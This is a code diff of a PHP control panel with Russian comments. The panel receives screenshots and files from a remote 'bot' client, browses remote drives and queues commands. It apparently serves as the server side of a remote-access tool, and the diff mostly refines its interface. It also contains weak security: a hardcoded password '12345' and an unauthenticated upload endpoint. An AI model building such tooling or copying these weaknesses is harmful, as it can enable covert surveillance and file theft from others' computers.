@@ -14,7 +14,6 @@ define('PANEL_PASSWORD', '12345');
 $cache_dir = __DIR__ . '/explorer_cache/';
 if (!is_dir($cache_dir)) mkdir($cache_dir, 0777, true);
 
-// ФУНКЦИЯ ДЛЯ ЗАПРОСОВ К SUPABASE
 function supabaseRequest($endpoint, $method = 'GET', $data = null, $extraHeaders = []) {
     $ch = curl_init(SUPABASE_URL . $endpoint);
     $headers = [
@@ -38,7 +37,6 @@ function supabaseRequest($endpoint, $method = 'GET', $data = null, $extraHeaders
     return json_decode($res, true) ?: [];
 }
 
-// ФУНКЦИЯ ОЧИСТКИ ФАЙЛОВ СТАРШЕ 24 ЧАСОВ (86400 секунд)
 function cleanOldFiles() {
     $folders = [__DIR__ . '/screenshots/', __DIR__ . '/downloads/'];
     foreach ($folders as $dir) {
@@ -55,7 +53,7 @@ function cleanOldFiles() {
 }
 
 // =========================================================================
-// 1. ПРИЕМ ФАЙЛОВ, СКРИНШОТОВ И СТРУКТУРЫ ОТ C#-БОТА (БЕЗ ТРЕБОВАНИЯ ПАРОЛЯ)
+// 1. ПРИЕМ ФАЙЛОВ И ДАННЫХ ОТ БОТА (БЕЗ ТРЕБОВАНИЯ ПАРОЛЯ)
 // =========================================================================
 if (isset($_POST['screenshot_device_id'])) {
     $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['screenshot_device_id']);
@@ -68,14 +66,23 @@ if (isset($_POST['screenshot_device_id'])) {
         exit;
     }
     
-    // Сохранение скачанного файла
+    // Сохранение скачанного файла с ПК
     if (isset($_FILES['downloaded_file'])) {
         $upload_dir = __DIR__ . '/downloads/';
         if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
+        
+        if ($_FILES['downloaded_file']['error'] !== UPLOAD_ERR_OK) {
+            echo "SERVER_ERROR_UPLOAD_CODE_" . $_FILES['downloaded_file']['error'];
+            exit;
+        }
+
         $filename = basename($_FILES['downloaded_file']['name']);
-        if (move_uploaded_file($_FILES['downloaded_file']['tmp_name'], $upload_dir . $dev_id . '_' . $filename)) {
+        $target_file = $upload_dir . $dev_id . '_' . $filename;
+        if (move_uploaded_file($_FILES['downloaded_file']['tmp_name'], $target_file)) {
             file_put_contents($cache_dir . $dev_id . '_lastfile.txt', $filename);
             echo "SERVER_SAVED_FILE";
+        } else {
+            echo "SERVER_ERROR_MOVE";
         }
         exit;
     }
@@ -96,7 +103,7 @@ if (isset($_POST['screenshot_device_id'])) {
 }
 
 // =========================================================================
-// 2. АВТОРИЗАЦИЯ ДЛЯ ВЕБ-ПАНЕЛИ (ДЛЯ ЧЕЛОВЕКА В БРАУЗЕРЕ)
+// 2. АВТОРИЗАЦИЯ ВЕБ-ПАНЕЛИ
 // =========================================================================
 $login_error = "";
 if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['login_password'])) {
@@ -120,7 +127,6 @@ if (isset($_SESSION['auth']) && $_SESSION['auth'] === true) {
     }
 }
 
-// Показываем форму входа, если пользователь не авторизован в браузере
 if (!$is_authenticated) {
     ?>
     <!DOCTYPE html>
@@ -154,10 +160,10 @@ if (!$is_authenticated) {
 }
 
 // =========================================================================
-// 3. ОСНОВНАЯ ЛОГИКА ВЕБ-ПАНЕЛИ (АВТОРИЗОВАННЫЙ ДОСТУП)
+// 3. ОСНОВНАЯ ЛОГИКА ВЕБ-ПАНЕЛИ
 // =========================================================================
 
-// AJAX ОБНОВЛЕНИЕ ДАННЫХ ДЛЯ ПАНЕЛИ
+// API обновление для JS
 if (isset($_GET['api_refresh_all'])) {
     header('Content-Type: application/json');
     
@@ -211,7 +217,7 @@ if (isset($_GET['api_refresh_all'])) {
     exit;
 }
 
-// СКАЧИВАНИЕ ФАЙЛОВ И СКРИНШОТОВ ЧЕРЕЗ БРАУЗЕР
+// Отдача файла браузеру
 if (isset($_GET['get_file']) && isset($_GET['dev'])) {
     $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['dev']);
     $file = __DIR__ . '/downloads/' . $dev_id . '_' . basename($_GET['get_file']);
@@ -219,7 +225,7 @@ if (isset($_GET['get_file']) && isset($_GET['dev'])) {
         header('Content-Type: application/octet-stream');
         header('Content-Disposition: attachment; filename="' . basename($_GET['get_file']) . '"');
         readfile($file);
-    } else { echo "Файл не найден."; }
+    } else { echo "Файл не найден на сервере."; }
     exit;
 }
 if (isset($_GET['download_screen'])) {
@@ -229,7 +235,7 @@ if (isset($_GET['download_screen'])) {
     exit;
 }
 
-// ОБРАБОТЧИК КНОПОК ПАНЕЛИ
+// Обработка команд из формы
 if ($_SERVER["REQUEST_METHOD"] === "POST" && !isset($_POST['login_password'])) {
     $action = $_POST["action"] ?? ""; 
     $device_id = $_POST["device_id"] ?? ""; 
@@ -266,7 +272,7 @@ body{ margin:0; font-family:system-ui, sans-serif; background:#090d16; color:#e2
 .sync-indicator{ font-size:12px; color:#34d399; font-weight: bold;}
 .dot{ width:8px; height:8px; background:#34d399; border-radius:50%; margin-right:8px; display:inline-block; animation: pulse 1s infinite; }
 @keyframes pulse { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
-.container{ padding:24px; display:grid; grid-template-columns:repeat(auto-fill,minmax(360px,1fr)); gap:20px; }
+.container{ padding:24px; display:grid; grid-template-columns:repeat(auto-fill,minmax(380px,1fr)); gap:20px; }
 .card{ background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; transition: 0.3s;}
 .online-card { border-color: #064e3b; box-shadow: 0 4px 20px rgba(4,120,87,0.15); }
 .offline-card { border-color: #1f2937; opacity: 0.85; }
@@ -280,10 +286,32 @@ button, .btn-link{ width:100%; margin-top:8px; padding:10px; border-radius:8px; 
 .orange { background:#d97706; color:white; } .orange:hover{ background:#b45309; }
 .red { background:#dc2626; color:white; } .red:hover{ background:#b91c1c; }
 .gray-danger { background:#374151; color:#f3f4f6; border: 1px solid #4b5563; } .gray-danger:hover{ background:#1f2937; }
-.explorer-box { background:#030712; border:1px solid #1f2937; border-radius:8px; padding:10px; margin-top:10px; max-height:280px; overflow-y:auto; }
-.exp-item { display:flex; justify-content:space-between; align-items:center; padding:6px; border-bottom:1px solid #1f2937; font-size:12px; }
+
+/* Увеличенный и удобный проводник файлов */
+.explorer-box { 
+    background:#030712; 
+    border:1px solid #1f2937; 
+    border-radius:8px; 
+    padding:10px; 
+    margin-top:10px; 
+    height: 450px; /* Увеличено с 280px до 450px */
+    overflow-y: auto; 
+    scrollbar-width: thin;
+    scrollbar-color: #374151 #030712;
+}
+.exp-item { display:flex; justify-content:space-between; align-items:center; padding:7px 4px; border-bottom:1px solid #1f2937; font-size:12px; }
 .exp-btn { background:none; border:none; color:#60a5fa; text-align:left; padding:0; width:auto; margin:0; display:inline; font-weight:normal; font-family:monospace; cursor:pointer;}
 .exp-btn:hover { text-decoration:underline; color:#93c5fd; }
+
+.download-ready-box {
+    background: #064e3b;
+    border: 1px solid #059669;
+    border-radius: 8px;
+    padding: 10px;
+    margin-top: 12px;
+    text-align: center;
+}
+
 .log-section{ margin:24px; background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; overflow-x:auto;}
 table{ width:100%; border-collapse:collapse; font-size:13px;}
 th, td{ padding:12px; border-bottom:1px solid #1f2937; text-align:left;}
@@ -325,6 +353,9 @@ th { color: #64748b; font-size: 11px; text-transform: uppercase;}
 </div>
 
 <script>
+// Глобальный объект для сохранения позиции скролла каждого проводника
+let explorerScrollPositions = {};
+
 function sendCmdAsync(deviceId, action, targetPath = '') {
     let formData = new FormData();
     formData.append('action', action);
@@ -336,6 +367,14 @@ function sendCmdAsync(deviceId, action, targetPath = '') {
 
 function startRealtimeMonitor() {
     setInterval(() => {
+        // 1. Запоминаем текущую позицию скролла перед обновлением HTML
+        document.querySelectorAll('.explorer-box').forEach(box => {
+            let devId = box.dataset.devid;
+            if (devId) {
+                explorerScrollPositions[devId] = box.scrollTop;
+            }
+        });
+
         fetch('?api_refresh_all=1')
         .then(res => res.json())
         .then(data => {
@@ -367,12 +406,21 @@ function startRealtimeMonitor() {
                             if (item.is_dir) {
                                 explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" onclick="sendCmdAsync('${id}', 'get_files', '${safePath}')">📁 ${item.name}</button></div>`;
                             } else {
-                                explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" style="color:#10b981;" onclick="if(confirm('Скачать?')) sendCmdAsync('${id}', 'download_file', '${safePath}')">📄 ${item.name}</button><span style="font-size:10px; color:#4b5563;">${item.size}</span></div>`;
+                                explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" style="color:#10b981;" onclick="if(confirm('Запросить скачивание с ПК?')) sendCmdAsync('${id}', 'download_file', '${safePath}')">📄 ${item.name}</button><span style="font-size:10px; color:#4b5563;">${item.size}</span></div>`;
                             }
                         });
                     }
 
-                    let downloadBtnHtml = pc.last_file ? `<a href="?get_file=${encodeURIComponent(pc.last_file)}&dev=${id}" class="btn-link green" style="background:#10b981; margin-top:8px;">💾 Скачать: ${pc.last_file}</a>` : '';
+                    // Заметный блок скачивания файла
+                    let downloadBtnHtml = '';
+                    if (pc.last_file) {
+                        downloadBtnHtml = `
+                        <div class="download-ready-box">
+                            <span style="font-size:12px; color:#a7f3d0; font-weight:bold; display:block;">Готов к сохранению:</span>
+                            <a href="?get_file=${encodeURIComponent(pc.last_file)}&dev=${id}" class="btn-link green" style="background:#10b981; margin-top:6px; font-weight:bold;">💾 СКАЧАТЬ НА ЭТОТ ПК: ${pc.last_file}</a>
+                        </div>`;
+                    }
+
                     let screenshotBtnHtml = pc.has_screenshot ? `<a href="?download_screen=${id}&v=${pc.screenshot_time}" class="btn-link green" target="_blank" style="margin-bottom:6px; background:#4f46e5;">📥 Посмотреть скриншот</a>` : '';
 
                     containerHtml += `
@@ -388,8 +436,11 @@ function startRealtimeMonitor() {
                         <div class="name" style="font-size:14px;">📂 Проводник:</div>
                         <span style="font-size:11px; color:#64748b; font-family:monospace; display:block; margin-bottom:4px;">${pc.current_path}</span>
                         <button type="button" class="blue" style="background:#0284c7; margin:0;" onclick="sendCmdAsync('${id}', 'get_files', 'C:\\\\')">🔄 Корень диска C:</button>
-                        <div class="explorer-box">${explorerHtml}</div>
-                        <div>${downloadBtnHtml}</div>
+                        
+                        <div class="explorer-box" data-devid="${id}">${explorerHtml}</div>
+                        
+                        ${downloadBtnHtml}
+
                         <hr style="border-color:#1f2937; margin:15px 0;">
                         <button type="button" class="blue" onclick="sendCmdAsync('${id}', 'take_screenshot')">📸 Скриншот</button>
                         <div>${screenshotBtnHtml}</div>
@@ -399,9 +450,18 @@ function startRealtimeMonitor() {
                         <button type="button" class="gray-danger" onclick="if(confirm('Удалить ПК?')) sendCmdAsync('${id}', 'delete')">🗑 Удалить</button>
                     </div>`;
                 }
+                
                 if (container.dataset.lastHtml !== containerHtml) {
                     container.innerHTML = containerHtml;
                     container.dataset.lastHtml = containerHtml;
+
+                    // 2. Восстанавливаем позицию скролла ПОСЛЕ вставки нового HTML
+                    document.querySelectorAll('.explorer-box').forEach(box => {
+                        let devId = box.dataset.devid;
+                        if (devId && explorerScrollPositions[devId] !== undefined) {
+                            box.scrollTop = explorerScrollPositions[devId];
+                        }
+                    });
                 }
             }
 
